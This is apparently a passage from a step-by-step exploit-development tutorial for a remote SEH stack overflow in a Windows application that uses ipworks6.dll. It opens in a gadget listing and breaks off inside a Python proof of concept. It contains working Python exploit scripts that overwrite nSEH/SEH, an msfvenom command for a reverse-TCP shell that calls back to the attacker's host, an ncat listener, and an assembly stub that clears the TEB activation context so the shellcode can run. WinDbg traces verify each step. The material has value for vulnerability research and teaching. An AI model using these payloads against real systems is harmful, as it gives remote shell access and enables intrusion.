0x263adbfb | POP ECX; POP ECX; RET;
0x263af66b | POP ECX; POP ECX; RET;
0x26345707 | POP ECX; POP ESI; RET;
0x263667f0 | POP ECX; POP ESI; RET;
0x263ab01a | POP ECX; POP ESI; RET;
0x263420c8 | POP ESI; POP EBX; RET;
0x263427e3 | POP ESI; POP EBX; RET;
0x2634687e | POP ESI; POP EBX; RET;
0x2634a242 | POP ESI; POP EBX; RET;
0x2634dc56 | POP ESI; POP EBX; RET;
0x263552cb | POP ESI; POP EBX; RET;
0x2636caf5 | POP ESI; POP EBX; RET;
0x2636f107 | POP ESI; POP EBX; RET;
0x2636f2f4 | POP ESI; POP EBX; RET;
0x26374d8d | POP ESI; POP EBX; RET;
0x26375063 | POP ESI; POP EBX; RET;
0x263752a4 | POP ESI; POP EBX; RET;
0x263786a4 | POP ESI; POP EBX; RET;
0x26378f7c | POP ESI; POP EBX; RET;
0x26378fb7 | POP ESI; POP EBX; RET;
0x2637c8d0 | POP ESI; POP EBX; RET;
0x26380fae | POP ESI; POP EBX; RET;
0x2638208a | POP ESI; POP EBX; RET;
0x263856ef | POP ESI; POP EBX; RET;
0x26385760 | POP ESI; POP EBX; RET;
0x263889b7 | POP ESI; POP EBX; RET;
0x2638943a | POP ESI; POP EBX; RET;
0x2638fb01 | POP ESI; POP EBX; RET;
0x263915a8 | POP ESI; POP EBX; RET;
0x263929ca | POP ESI; POP EBX; RET;
0x263958a7 | POP ESI; POP EBX; RET;
0x26395c2f | POP ESI; POP EBX; RET;
0x2639720b | POP ESI; POP EBX; RET;
0x26398798 | POP ESI; POP EBX; RET;
0x263987e6 | POP ESI; POP EBX; RET;
0x2639ba06 | POP ESI; POP EBX; RET;
0x2639bb45 | POP ESI; POP EBX; RET;
0x2639da3d | POP ESI; POP EBX; RET;
0x2639f7d0 | POP ESI; POP EBX; RET;
0x2639fc1e | POP ESI; POP EBX; RET;
0x263a5d66 | POP ESI; POP EBX; RET;
0x263a5df1 | POP ESI; POP EBX; RET;
0x263a8a01 | POP ESI; POP EBX; RET;
0x263ac3d2 | POP ESI; POP EBX; RET;
0x263acb3f | POP ESI; POP EBX; RET;
0x263af233 | POP ESI; POP EBX; RET;
0x263afd7b | POP ESI; POP EBX; RET;
0x263b0306 | POP ESI; POP EBX; RET;
0x263ab12d | POP ESI; POP ECX; RET;
0x263b0367 | POP ESI; POP EDI; RET;
0x263b040b | POP ESI; POP EDI; RET;
0x26378f0c | POP ESI; POP EBP; RET;
0x2637de9c | POP ESI; POP EBP; RET;
0x26387e9f | POP ESI; POP EBP; RET;
0x263933dd | POP ESI; POP EBP; RET;
0x263ab98a | POP ESI; POP EBP; RET;
0x263ac0ef | POP ESI; POP EBP; RET;
0x263ac16b | POP ESI; POP EBP; RET;
0x263ac301 | POP ESI; POP EBP; RET;
0x263ac44e | POP ESI; POP EBP; RET;
0x263ad70d | POP ESI; POP EBP; RET;
0x263ae2b3 | POP ESI; POP EBP; RET;
0x263757db | POP EDI; POP EBX; RET;
0x2639585c | POP EDI; POP EBX; RET;
0x26341825 | POP EDI; POP ESI; RET;
0x26344c83 | POP EDI; POP ESI; RET;
0x2634c725 | POP EDI; POP ESI; RET;
0x2634e7c3 | POP EDI; POP ESI; RET;
0x2634efd2 | POP EDI; POP ESI; RET;
0x26351309 | POP EDI; POP ESI; RET;
0x26356032 | POP EDI; POP ESI; RET;
0x263573e7 | POP EDI; POP ESI; RET;
0x2635805c | POP EDI; POP ESI; RET;
0x2636451a | POP EDI; POP ESI; RET;
0x26366223 | POP EDI; POP ESI; RET;
0x26368f96 | POP EDI; POP ESI; RET;
0x2636b30e | POP EDI; POP ESI; RET;
0x2636f3b0 | POP EDI; POP ESI; RET;
0x2637127f | POP EDI; POP ESI; RET;
0x2637144b | POP EDI; POP ESI; RET;
0x26371800 | POP EDI; POP ESI; RET;
0x263719c8 | POP EDI; POP ESI; RET;
0x26372a02 | POP EDI; POP ESI; RET;
0x26373a23 | POP EDI; POP ESI; RET;
0x26373a94 | POP EDI; POP ESI; RET;
0x26375003 | POP EDI; POP ESI; RET;
0x2637577a | POP EDI; POP ESI; RET;
0x26375c53 | POP EDI; POP ESI; RET;
0x2637717d | POP EDI; POP ESI; RET;
0x26378245 | POP EDI; POP ESI; RET;
0x2637873a | POP EDI; POP ESI; RET;
0x263787b2 | POP EDI; POP ESI; RET;
0x26378a05 | POP EDI; POP ESI; RET;
0x2637cba0 | POP EDI; POP ESI; RET;
0x2637d7f3 | POP EDI; POP ESI; RET;
0x26381750 | POP EDI; POP ESI; RET;
0x26381795 | POP EDI; POP ESI; RET;
0x263817da | POP EDI; POP ESI; RET;
0x263818d2 | POP EDI; POP ESI; RET;
0x263822b4 | POP EDI; POP ESI; RET;
0x26387ef8 | POP EDI; POP ESI; RET;
0x26388052 | POP EDI; POP ESI; RET;
0x26389804 | POP EDI; POP ESI; RET;
0x2638a01f | POP EDI; POP ESI; RET;
0x2638a09c | POP EDI; POP ESI; RET;
0x2638c5d1 | POP EDI; POP ESI; RET;
0x2638d0eb | POP EDI; POP ESI; RET;
0x2638d13f | POP EDI; POP ESI; RET;
0x263942fc | POP EDI; POP ESI; RET;
0x26398a20 | POP EDI; POP ESI; RET;
0x26398c8d | POP EDI; POP ESI; RET;
0x26398fd8 | POP EDI; POP ESI; RET;
0x2639a3ba | POP EDI; POP ESI; RET;
0x2639b026 | POP EDI; POP ESI; RET;
0x2639ba74 | POP EDI; POP ESI; RET;
0x263a0b5e | POP EDI; POP ESI; RET;
0x263a0bae | POP EDI; POP ESI; RET;
0x263a0bfe | POP EDI; POP ESI; RET;
0x263a0d93 | POP EDI; POP ESI; RET;
0x263a518c | POP EDI; POP ESI; RET;
0x263a70af | POP EDI; POP ESI; RET;
0x263a9e24 | POP EDI; POP ESI; RET;
0x263ad1d1 | POP EDI; POP ESI; RET;
0x263ad22a | POP EDI; POP ESI; RET;
0x263ad289 | POP EDI; POP ESI; RET;
0x263ad9c7 | POP EDI; POP ESI; RET;
0x263adfb5 | POP EDI; POP ESI; RET;
0x263ae252 | POP EDI; POP ESI; RET;
0x263aea16 | POP EDI; POP ESI; RET;
0x263b0713 | POP EDI; POP ESI; RET;
0x263412fd | POP EBP; POP EBX; RET;
0x26377106 | POP EBP; POP EBX; RET;
0x2639820f | POP EBP; POP EBX; RET;
0x2639bc8f | POP EBP; POP EBX; RET;
0x263ae1bd | POP EBP; POP EBX; RET;
0x2635f025 | CALL DWORD [EBP + 08]
0x2635f0d5 | CALL DWORD [EBP + 08]
0x26392054 | CALL DWORD [EBP + 08]
0x263ad3bc | CALL DWORD [EBP + 14]
0x263ad431 | CALL DWORD [EBP + 14]
```

We will use the gadget at `0x263ae1bd` for a `POP EBP; POP EBX; RET` instruction since it matches the stack offsets at the time the handler is executed. With this gadget, we will still need to redirect execution to from the `EXCEPTION_REGISTRATION_RECORD.Next` to jump over the `EXCEPTION_REGISTRATION_RECORD.Handler` value within the 4 bytes of the `EXCEPTION_REGISTRATION_RECORD.Next` value where our gadget will redirect execution. We should need to jump 8 bytes in order to move `EIP` from the beginning of the `EXCEPTION_REGISTRATION_RECORD` to the end where the shellcode would begin on the stack:

```bash
/opt/metasploit-framework/embedded/bin/ruby \
  /opt/metasploit-framework/embedded/framework/tools/exploit/nasm_shell.rb
# nasm > JMP SHORT 0x8
# 00000000  EB06              jmp short 0x8
```

Since the instruction above is not 4 bytes long, we will add 2 `NOP` instructions after it. Combine this knowledge into a new PoC to test our redirection with dummy shellcode on the stack after the SEH handler:

```python
import sys, socket, struct

BAD_BYTES = b"\x3e" # >
PAYLOAD_LENGTH = 2000

nSEH = b"\xEB\x06\x90\x90"           # JMP SHORT 0x8; NOP; NOP
SEH  = struct.pack("<I", 0x263ae1bd) # ipworks6.dll | POP EBP; POP EBX; RET

SHELLCODE = (b"\x90" * 512) # dummy shellcode

pkt  = b"<"
pkt += (b"A" * 40)
pkt += nSEH
pkt += SEH
pkt += SHELLCODE
pkt += (b"B" * (PAYLOAD_LENGTH - len(pkt)))

# check for bad bytes
for c in pkt:
  if c in BAD_BYTES:
    print(f"[-] found bad byte 0x{c:02x} in payload")
    sys.exit(-1)

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((sys.argv[1], int(sys.argv[2])))
s.send(pkt)
s.close()
```

Send this new PoC and set a breakpoint in WinDbg for our gadget before continuing execution to the SEH handlers:

```
(1470.604): Access violation - code c0000005 (first chance)
First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
eax=00000042 ebx=00000624 ecx=00000002 edx=00000001 esi=04119e10 edi=761b23a0
eip=00466e3f esp=0014f8b4 ebp=0014fa10 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010246
IMS+0x66e3f:
00466e3f 88441dcc        mov     byte ptr [ebp+ebx-34h],al  ss:0023:00150000=41
0:000> bp 0x263ae1bd
0:000> g
Breakpoint 0 hit
eax=00000000 ebx=00000000 ecx=263ae1bd edx=76f65b50 esi=00000000 edi=00000000
eip=263ae1bd esp=0014f2c0 ebp=0014f2e0 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
ipworks6!NetCode_StaticDestroy+0x39852:
263ae1bd 5d              pop     ebp
```

Nice! We hit our breakpoint. Now single step to our SEH handler execution:

```
0:000> r
eax=00000000 ebx=00000000 ecx=263ae1bd edx=76f65b50 esi=00000000 edi=00000000
eip=263ae1bd esp=0014f2c0 ebp=0014f2e0 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
ipworks6!NetCode_StaticDestroy+0x39852:
263ae1bd 5d              pop     ebp
0:000> t
eax=00000000 ebx=00000000 ecx=263ae1bd edx=76f65b50 esi=00000000 edi=00000000
eip=263ae1be esp=0014f2c4 ebp=76f65b32 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
ipworks6!NetCode_StaticDestroy+0x39853:
263ae1be 5b              pop     ebx
0:000> t
eax=00000000 ebx=0014f3c0 ecx=263ae1bd edx=76f65b50 esi=00000000 edi=00000000
eip=263ae1bf esp=0014f2c8 ebp=76f65b32 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
ipworks6!NetCode_StaticDestroy+0x39854:
263ae1bf c3              ret
0:000> t
eax=00000000 ebx=0014f3c0 ecx=263ae1bd edx=76f65b50 esi=00000000 edi=00000000
eip=0014fa04 esp=0014f2cc ebp=76f65b32 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
0014fa04 eb06            jmp     0014fa0c
```

Here we hit our `JMP SHORT 0x8` bytes on the stack. In the disassembly view of WinDbg we can see what our stack looks like as assembly code:

![23](./img/23.png)

Here the `0x263ae1bd` value for the `EXCEPTION_REGISTRATION_RECORD.Handler` value became a `MOV EBP, 0X90263AE1` when combined with the `NOP`s in our shellcode placeholder. Single step to execute the `NOP` shellcode:

```
0:000> r
eax=00000000 ebx=0014f3c0 ecx=263ae1bd edx=76f65b50 esi=00000000 edi=00000000
eip=0014fa04 esp=0014f2cc ebp=76f65b32 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
0014fa04 eb06            jmp     0014fa0c
0:000> t
eax=00000000 ebx=0014f3c0 ecx=263ae1bd edx=76f65b50 esi=00000000 edi=00000000
eip=0014fa0c esp=0014f2cc ebp=76f65b32 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
0014fa0c 90              nop
0:000> t
eax=00000000 ebx=0014f3c0 ecx=263ae1bd edx=76f65b50 esi=00000000 edi=00000000
eip=0014fa0d esp=0014f2cc ebp=76f65b32 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
0014fa0d 90              nop
0:000> t
eax=00000000 ebx=0014f3c0 ecx=263ae1bd edx=76f65b50 esi=00000000 edi=00000000
eip=0014fa0e esp=0014f2cc ebp=76f65b32 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
0014fa0e 90              nop
0:000> t
eax=00000000 ebx=0014f3c0 ecx=263ae1bd edx=76f65b50 esi=00000000 edi=00000000
eip=0014fa0f esp=0014f2cc ebp=76f65b32 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
0014fa0f 90              nop
```

And that is remote code execution!

## Generating Shellcode

Now we just need some real shellcode:

```bash
IP=X.X.X.X # NOTE: set this to your LHOST IP 
/opt/metasploit-framework/bin/msfvenom \
  -p windows/shell_reverse_tcp \
  LHOST=$IP                    \
  LPORT=6969                   \
  EXITFUNC=thread              \
  -f py                        \
  -v SHELLCODE                 \
  –e x86/shikata_ga_nai        \
  -b "\x3E"           
# set up a network listener 
ncat -nvlp 6969
```

And then add the generated shellcode to the PoC to replace the `SHELLCODE` variable:

**NOTE:** A buffer of 16 `nop` instructions is prepended before the shellcode to allow for the `shikata_ga_nai` decoder to work on the shellcode in memory

```python
import sys, socket, struct

BAD_BYTES = b"\x3e" # >
PAYLOAD_LENGTH = 2000

nSEH = b"\xEB\x06\x90\x90"           # JMP SHORT 0x8; NOP; NOP
SEH  = struct.pack("<I", 0x263ae1bd) # ipworks6.dll | POP EBP; POP EBX; RET

SHELLCODE = # NOTE: you need to fill this in

pkt  = b"<"
pkt += (b"A" * 40)
pkt += nSEH
pkt += SEH
pkt += (b"\x90" * 32) # NOP sled for shikata_ga_nai decoder
pkt += SHELLCODE
pkt += (b"B" * (PAYLOAD_LENGTH - len(pkt)))

# check for bad bytes
for c in pkt:
  if c in BAD_BYTES:
    print(f"[-] found bad byte 0x{c:02x} in payload")
    sys.exit(-1)

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((sys.argv[1], int(sys.argv[2])))
s.send(pkt)
s.close()
```

However, when we send the new PoC, we get a new error in WinDbg?

```
(1840.9d8): Access violation - code c0000005 (first chance)
First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
eax=00000042 ebx=00000624 ecx=00000002 edx=00000001 esi=04149e10 edi=761b23a0
eip=00466e3f esp=0014f8b4 ebp=0014fa10 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010246
IMS+0x66e3f:
00466e3f 88441dcc        mov     byte ptr [ebp+ebx-34h],al  ss:0023:00150000=41
0:000> g
(1840.9d8): Access violation - code c0000005 (first chance)
First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
eax=0036b184 ebx=0014edd8 ecx=00000000 edx=00000002 esi=42424242 edi=00000000
eip=76ef5326 esp=0014ed88 ebp=0014eda0 iopl=0         nv up ei pl nz ac po cy
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010213
ntdll!RtlpFindNextActivationContextSection+0x130:
76ef5326 8b7e10          mov     edi,dword ptr [esi+10h] ds:0023:42424252=????????
```

Why is `RtlpFindNextActivationContextSection` trying to dereference a pointer that seems to be `0x42424242` or `BBBB` in ASCII?

## Thread Activation Context Error

The error we are given is not very insightful for what is going on. The function name has something to say about finding the next activation context. We do know that the `BBBB` values in `ESI` for the exception are likely from the second half of our buffer after the shellcode. Re-run the exploit and set a **thread local** breakpoint at this function before we attempt to run our shellcode to see what happens:

```
(870.130c): Access violation - code c0000005 (first chance)
First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
eax=00000042 ebx=00000624 ecx=00000002 edx=00000001 esi=04299e10 edi=761b23a0
eip=00466e3f esp=0014f8b4 ebp=0014fa10 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010246
IMS+0x66e3f:
00466e3f 88441dcc        mov     byte ptr [ebp+ebx-34h],al  ss:0023:00150000=41
0:000> ~bp RtlpFindNextActivationContextSection
0:000> bl
     0 e Disable Clear  76ef51f6     0001 (0001)  0:~000 ntdll!RtlpFindNextActivationContextSection
0:000> g
Breakpoint 0 hit
eax=0014edc0 ebx=00000003 ecx=0014edd8 edx=0014edc4 esi=00000000 edi=00000000
eip=76ef51f6 esp=0014eda4 ebp=0014edf4 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
ntdll!RtlpFindNextActivationContextSection:
76ef51f6 8bff            mov     edi,edi
```

Now single step to see what is happening. After some stepping, we get to the following sequence that leads to our crash:

```
0:000> t
eax=00000000 ebx=0014edd8 ecx=00000000 edx=00000002 esi=00000000 edi=00000000
eip=76ef529a esp=0014ed88 ebp=0014eda0 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
ntdll!RtlpFindNextActivationContextSection+0xa4:
76ef529a 8b45f8          mov     eax,dword ptr [ebp-8] ss:0023:0014ed98=002f0000
0:000> t
eax=002f0000 ebx=0014edd8 ecx=00000000 edx=00000002 esi=00000000 edi=00000000
eip=76ef529d esp=0014ed88 ebp=0014eda0 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
ntdll!RtlpFindNextActivationContextSection+0xa7:
76ef529d 8b80a8010000    mov     eax,dword ptr [eax+1A8h] ds:0023:002f01a8=002f0184
0:000> t
eax=002f0184 ebx=0014edd8 ecx=00000000 edx=00000002 esi=00000000 edi=00000000
eip=76ef52a3 esp=0014ed88 ebp=0014eda0 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
ntdll!RtlpFindNextActivationContextSection+0xad:
76ef52a3 85c0            test    eax,eax
0:000> t
eax=002f0184 ebx=0014edd8 ecx=00000000 edx=00000002 esi=00000000 edi=00000000
eip=76ef52a5 esp=0014ed88 ebp=0014eda0 iopl=0         nv up ei pl nz na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206
ntdll!RtlpFindNextActivationContextSection+0xaf:
76ef52a5 7406            je      ntdll!RtlpFindNextActivationContextSection+0xb7 (76ef52ad) [br=0]
0:000> t
eax=002f0184 ebx=0014edd8 ecx=00000000 edx=00000002 esi=00000000 edi=00000000
eip=76ef52a7 esp=0014ed88 ebp=0014eda0 iopl=0         nv up ei pl nz na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206
ntdll!RtlpFindNextActivationContextSection+0xb1:
76ef52a7 8b30            mov     esi,dword ptr [eax]  ds:0023:002f0184=0014fdac
0:000> t
eax=002f0184 ebx=0014edd8 ecx=00000000 edx=00000002 esi=0014fdac edi=00000000
eip=76ef52a9 esp=0014ed88 ebp=0014eda0 iopl=0         nv up ei pl nz na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206
ntdll!RtlpFindNextActivationContextSection+0xb3:
76ef52a9 85f6            test    esi,esi
0:000> t
eax=002f0184 ebx=0014edd8 ecx=00000000 edx=00000002 esi=0014fdac edi=00000000
eip=76ef52ab esp=0014ed88 ebp=0014eda0 iopl=0         nv up ei pl nz na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206
ntdll!RtlpFindNextActivationContextSection+0xb5:
76ef52ab 7554            jne     ntdll!RtlpFindNextActivationContextSection+0x10b (76ef5301) [br=1]
0:000> t
eax=002f0184 ebx=0014edd8 ecx=00000000 edx=00000002 esi=0014fdac edi=00000000
eip=76ef5301 esp=0014ed88 ebp=0014eda0 iopl=0         nv up ei pl nz na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206
ntdll!RtlpFindNextActivationContextSection+0x10b:
76ef5301 8b7604          mov     esi,dword ptr [esi+4] ds:0023:0014fdb0=42424242
```

Here we see that we we execute the following:

```assembly
mov     eax,dword ptr [ebp-8]
mov     eax,dword ptr [eax+1A8h]
test    eax,eax
je      ntdll!RtlpFindNextActivationContextSection+0xb7 ; we do not take this branch !
mov     esi,dword ptr [eax]
test    esi,esi
jne     ntdll!RtlpFindNextActivationContextSection+0x10b ; we do not take this branch!
mov     esi,dword ptr [esi+4]
```

We seem to reach to `EBP-8` to pull a pointer into `EAX` that we then dereference at offset `0x1A8` to get another pointer. If this pointer is not NULL, we then dereference that pointer and check for NULL again before we hit our error by attempting to dereference `ESI+4`. The flow of pointers in the above crash is as follows:

```
002f0000 -> 002f0184 -> 0014fdac -> 42424242
```

So we will inspect these addresses manually in WinDbg:

```
0:000> !address 002f0000

Usage:                  TEB
Base Address:           002f0000
End Address:            002f1000
Region Size:            00001000 (   4.000 kB)
State:                  00001000          MEM_COMMIT
Protect:                00000004          PAGE_READWRITE
Type:                   00020000          MEM_PRIVATE
Allocation Base:        00200000
Allocation Protect:     00000004          PAGE_READWRITE
More info:              !teb 0x2f0000
More info:              dt $ntdllsym!_TEB 0x2f0000

Content source: 1 (target), length: b000
```

Ah! The first address is the TEB. Lets see what is at offset `0x1A8`:

```
0:000> dt $ntdllsym!_TEB 0x2f0000
ntdll!_TEB
   +0x000 NtTib            : _NT_TIB
   +0x01c EnvironmentPointer : (null) 
   +0x020 ClientId         : _CLIENT_ID
   +0x028 ActiveRpcHandle  : (null) 
   +0x02c ThreadLocalStoragePointer : 0x0074e7c8 Void
   +0x030 ProcessEnvironmentBlock : 0x002ef000 _PEB
   +0x034 LastErrorValue   : 0
   +0x038 CountOfOwnedCriticalSections : 0
   +0x03c CsrClientThread  : (null) 
   +0x040 Win32ThreadInfo  : 0x0000130c Void
   +0x044 User32Reserved   : [26] 0
   +0x0ac UserReserved     : [5] 0
   +0x0c0 WOW32Reserved    : (null) 
   +0x0c4 CurrentLocale    : 0x409
   +0x0c8 FpSoftwareStatusRegister : 0
   +0x0cc ReservedForDebuggerInstrumentation : [16] (null) 
   +0x10c SystemReserved1  : [26] (null) 
   +0x174 PlaceholderCompatibilityMode : 0 ''
   +0x175 PlaceholderHydrationAlwaysExplicit : 0 ''
   +0x176 PlaceholderReserved : [10]  ""
   +0x180 ProxiedProcessId : 0
   +0x184 _ActivationStack : _ACTIVATION_CONTEXT_STACK
   +0x19c WorkingOnBehalfTicket : [8]  ""
   +0x1a4 ExceptionCode    : 0n0
   +0x1a8 ActivationContextStackPointer : 0x002f0184 _ACTIVATION_CONTEXT_STACK
...
```

`ActivationContextStackPointer` is a pointer to an address in the TEB itself at offset `0x184`. This is the `_ActivationStack` field of the TEB. It seems that `0x184` is an `_ACTIVATION_CONTEXT_STACK`. Look there:

```
0:000> dx -r1 (*((ntdll!_ACTIVATION_CONTEXT_STACK *)0x2f0184))
    [+0x000] ActiveFrame      : 0x14fdac [Type: _RTL_ACTIVATION_CONTEXT_STACK_FRAME *]
    [+0x004] FrameListCache   [Type: _LIST_ENTRY]
    [+0x00c] Flags            : 0x2 [Type: unsigned long]
    [+0x010] NextCookieSequenceNumber : 0x4c [Type: unsigned long]
    [+0x014] StackId          : 0x4db46ee [Type: unsigned long]
```

Here we see the `0x14fdac` value. Select that:

```
0:000> dx -r1 ((ntdll!_RTL_ACTIVATION_CONTEXT_STACK_FRAME *)0x14fdac)
    [+0x000] Previous         : 0x42424242 [Type: _RTL_ACTIVATION_CONTEXT_STACK_FRAME *]
    [+0x004] ActivationContext : 0x42424242 [Type: _ACTIVATION_CONTEXT *]
    [+0x008] Flags            : 0x42424242 [Type: unsigned long]
```

Got it! So the application is trying to look for some `ActivationContext` value in the thread's TEB! Since the TEB says there is an activation context on the stack, `ntdll.dll` tries to look it up on the stack that we have corrupted with `B` values in order to generate the SEH exception we need to gain execution using the SEH handler by writing beyond the thread's stack! Normally we could just find another way to generate an exception without having to overwrite this activation context on the stack, but we noticed previously that the application has stack cookie checks in place. This means that if we do not cause an exception **within** the function we have a stack overflow in, we will be unable to gain execution control using SEH or an `EIP` overwrite since the stack cookie check will fail and crash the program once we try to leave the vulnerable function. Here are some helpful references for understanding this structure:

- https://www.geoffchappell.com/studies/windows/km/ntoskrnl/inc/api/pebteb/teb/index.htm
- https://doxygen.reactos.org/d5/df7/ndk_2rtltypes_8h_source.html#l00970

A simpler approach will be to prepend a shellcode stub to our current shellcode main payload that makes the checks in `ntdll` we saw above fail in order to prevent this error from happening in the first place:

```assembly
XOR EAX, EAX              ; EAX = NULL
MOV EBX, [fs:EAX + 0x1A8] ; EBX = TEB->ActivationContextStackPointer
MOV [EBX], EAX            ; TEB->_ActivationStack.ActiveFrame = NULL
```

Now get the byte codes for this:

```bash
/opt/metasploit-framework/embedded/bin/ruby \
  /opt/metasploit-framework/embedded/framework/tools/exploit/nasm_shell.rb
# nasm > XOR EAX, EAX
# 00000000  31C0              xor eax,eax
# nasm > MOV EBX, [fs:EAX + 0x1A8]
# 00000000  648B98A8010000    mov ebx,[fs:eax+0x1a8]
# nasm > MOV [EBX], EAX
# 00000000  8903              mov [ebx],eax
```

The `FS` segment register on x86 contains a pointer reference to the current thread's TEB when it is executing and at offset `0x18` in the `TEB.NT_TIB` is the virtual address of the TEB itself:

- https://devblogs.microsoft.com/oldnewthing/20190203-00/?p=101028
- https://www.nirsoft.net/kernel_struct/vista/NT_TIB.html

We will use this small assembly stub to overwrite the `_ActivationStack` pointer in the TEB to NULL to prevent the checks in `ntdll.dll`. Luckily, it does not contain the bad byte `>`!

**However, there is still an annoying edge case... Windows XP...** If we take a look at the ReactOS link above, we see the following:

```c
 #if (NTDDI_VERSION >= NTDDI_WS03SP1)
 typedef struct _ACTIVATION_CONTEXT_STACK
 {
     struct _RTL_ACTIVATION_CONTEXT_STACK_FRAME *ActiveFrame;
     LIST_ENTRY FrameListCache;
     ULONG Flags;
     ULONG NextCookieSequenceNumber;
     ULONG StackId;
 } ACTIVATION_CONTEXT_STACK, *PACTIVATION_CONTEXT_STACK;
 #else
 typedef struct _ACTIVATION_CONTEXT_STACK
 {
     ULONG Flags;
     ULONG NextCookieSequenceNumber;
     struct _RTL_ACTIVATION_CONTEXT_STACK_FRAME *ActiveFrame;
     LIST_ENTRY FrameListCache;
 } ACTIVATION_CONTEXT_STACK, *PACTIVATION_CONTEXT_STACK;
 #endif
```

Meaning that the definitions for an `ACTIVATION_CONTEXT_STACK` have changed! To make things even more annoying, there is the following image from the link explaining the TEB:

![41](./img/41.png)

This means that on Windows versions <= 5.2 we do not have to follow the pointer to the `ACTIVATION_CONTEXT_STACK` and instead just reference the structure in place! 

Our goal is to set the `ACTIVATION_CONTEXT_STACK.ActiveFrame` to NULL. This will prevent `ntdll` from trying to get information from the stack that we have corrupted. To do this, we will cheat a little bit :) We will use the fact that the only 2 definitions for `ACTIVATION_CONTEXT_STACK` have either `ActiveFrame` or `Flags` as the first 4 bytes. If we look up possible values for the `Flags` field, we see that there are no large values:

- https://doxygen.reactos.org/d5/df7/ndk_2rtltypes_8h_source.html#l00087

```c
 //
 // Flags in RTL_ACTIVATION_CONTEXT_STACK_FRAME (from Checked NTDLL)
 //
 #define RTL_ACTIVATION_CONTEXT_STACK_FRAME_FLAG_RELEASE_ON_DEACTIVATION 0x01
 #define RTL_ACTIVATION_CONTEXT_STACK_FRAME_FLAG_NO_DEACTIVATE           0x02
 #define RTL_ACTIVATION_CONTEXT_STACK_FRAME_FLAG_ON_FREE_LIST            0x04
 #define RTL_ACTIVATION_CONTEXT_STACK_FRAME_FLAG_HEAP_ALLOCATED          0x08
 #define RTL_ACTIVATION_CONTEXT_STACK_FRAME_FLAG_NOT_REALLY_ACTIVATED    0x10
 #define RTL_ACTIVATION_CONTEXT_STACK_FRAME_FLAG_ACTIVATED               0x20
 #define RTL_ACTIVATION_CONTEXT_STACK_FRAME_FLAG_DEACTIVATED             0x40
```

It seems like the max flag value is `0x40`. So we can use the following logic to basically cheat-test for a pointer:

**NOTE:** There is a crucial difference between how we access `ACTIVATION_CONTEXT_STACK.ActiveFrame` here...

```c
// here we use the magic constant 0x1000 assuming the max possible flag will be 0x1000
if ((*(uint32_t *)(TEB + 0x1A8)) > 0x1000) {
  // we can assume the value here is not a valid Flags value 
	// this means the first 4 bytes are the ActivationContextStackPointer
  TEB->ActivationContextStackPointer->ActiveFrame = NULL;
} else {
  // the value is not a pointer 
  // this means we are on an older version of windows with the structure in place
  TEB.ActivationContextStack.ActiveFrame = NULL;
}
```

Now we can convert this C logic into the following assembly stub:

```assembly
  XOR EAX, EAX              ; EAX = NULL
  MOV EBX, 0x1000           ; EBX = large undefined flag value that could NOT be a pointer
  MOV ECX, fs:[EAX + 0x18]  ; ECX = TEB->Self
  CMP [ECX + 0x1A8], EBX.   ; [TEB + 0x1A8] > 0x1000 ?
  JL  SHORT WINXP_AND_LOWER ; // we likely have WinXP or older!
  MOV EBX, [ECX + 0x1A8]    ; EBX = TEB->ActivationContextStackPointer
  MOV [EBX], EAX            ; TEB->_ActivationStack.ActiveFrame = NULL
  JMP SHORT DONE
WINXP_AND_LOWER:
  MOV [ECX + 0x1B0], EAX    ; TEB.ActivationContextStack.ActiveFrame = NULL
DONE:
```

To quickly assemble this stub, we can use the following resource:

- https://defuse.ca/online-x86-assembler.htm

You should get the following (remove the assembly comments or the online compiler will get mad at you):

![42](./img/42.png)

Add the opcode bytes to the PoC:

```python
import sys, socket, struct

BAD_BYTES = b"\x3e" # >
PAYLOAD_LENGTH = 2000

